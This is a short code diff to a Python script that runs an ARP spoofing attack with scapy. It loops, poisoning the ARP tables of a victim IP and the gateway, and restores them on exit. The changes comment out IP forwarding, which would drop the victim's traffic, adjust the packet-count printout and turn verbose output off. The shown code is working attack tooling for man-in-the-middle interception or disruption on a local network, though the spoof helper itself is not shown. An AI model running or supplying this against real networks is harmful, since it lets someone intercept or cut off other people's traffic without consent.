@@ -24,7 +24,7 @@ def spoofing(victim_ip, output = False):
     sleep = 2
     packets_count = 0
     gateway = scapy.conf.route.route("0.0.0.0")[2]
-    enable_ip_forwarding()
+    #enable_ip_forwarding()
     
     try:
         while True:
@@ -35,7 +35,7 @@ def spoofing(victim_ip, output = False):
             spoof(gateway, victim_ip, output)
 
             packets_count += 2
-            print(f"[+] Packets sent: {packets_count}")
+            print(f"\n[+] Packets sent: {packets_count}", end="")
 
             # Step 3
             time.sleep(sleep)
@@ -50,4 +50,4 @@ def spoofing(victim_ip, output = False):
 
         print("\n ARP tables restored.")
         
-spoofing(victim_ip, True)
+spoofing(victim_ip, False)
